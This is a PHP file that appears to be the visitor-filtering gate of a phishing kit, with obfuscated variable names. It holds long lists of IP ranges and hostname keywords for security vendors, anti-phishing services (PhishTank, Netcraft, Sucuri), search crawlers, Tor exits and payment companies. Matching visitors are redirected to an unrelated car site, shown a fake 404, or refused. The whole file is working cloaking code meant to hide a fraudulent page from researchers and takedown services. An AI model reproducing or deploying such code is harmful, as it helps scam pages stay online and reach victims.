<?php $blanco_cd28=$_SERVER['REMOTE_ADDR'];$blanco_c97=array("^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^173.239.*.*","^173.244.36.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","173.239.240.147",
"103.248.172.42",
"87.20.229.79",
"181.214.*.*",
"18.237.*.*",
"195.80.*.*",
"3.120.2*.*",
"104.222.*.*",
"88.212.*.*",
"40.94.*.*",
"87.113.96.90",
"165.227.0.128",
"52.250.30.*",
"185.229.190.140", 
"165.227.0.128", 
"46.101.94.163", 
"165.227.39.194",
"87.113.96.90",
"46.101.119.24",
"82.102.27.75", 
"173.239.230.97", 
"82.102.27.75", 
"87.113.96.90", 
"46.101.119.24", 
"173.239.230.97", 
"87.113.96.90", 
"87.113.96.90", 
"159.203.0.156", 
"162.243.187.126",
"82.102.27.75", 
"87.113.96.90",
"103.248.172.42", 
"103.248.172.42", 
"47.30.133.89", 
"103.248.172.42"
);if(in_array($blanco_cd28,$blanco_c97)){exit(header('Location: https://www.superhonda.com/'));}else{foreach($blanco_c97 as $blanco_a4){if(preg_match('/'.$blanco_a4.'/',$blanco_cd28)){header('Location: https://www.superhonda.com/');echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");}}}$blanco_e5=gethostbyaddr($blanco_cd28);$blanco_f6=array("drweb","hostinger","scanurl","above","google","Dr.Web","facebook","softlayer","amazonaws","cyveillance","dreamhost","netpilot","calyxinstitute","tor-exit","phishtank","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler");foreach($blanco_f6 as $e540ca){if(substr_count($blanco_e5,$e540ca)>0){http_response_code(403);

$logMessage = sprintf(
    "[%s] 403 Forbidden access from IP: %s to %s\n",
    date("Y-m-d H:i:s"),
    $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    $_SERVER['REQUEST_URI'] ?? 'unknown'
);
error_log($logMessage, 3, __DIR__ . '/forbidden.log');

// Display plain-text error message
header('Content-Type: text/plain');
echo "403 Forbidden\n";
echo "You don't have permission to access this resource.\n";

// Stop execution
exit;}}if(!empty($_SERVER['HTTP_USER_AGENT'])){$c3d1b=array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");foreach($c3d1b as $cef6a){if(strpos($_SERVER['HTTP_USER_AGENT'],$cef6a)!==false){http_response_code(403);

$logMessage = sprintf(
    "[%s] 403 Forbidden access from IP: %s to %s\n",
    date("Y-m-d H:i:s"),
    $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    $_SERVER['REQUEST_URI'] ?? 'unknown'
);
error_log($logMessage, 3, __DIR__ . '/forbidden.log');
header('Content-Type: text/plain');
echo "403 Forbidden\n";
echo "You don't have permission to access this resource.\n";
exit;}}}?>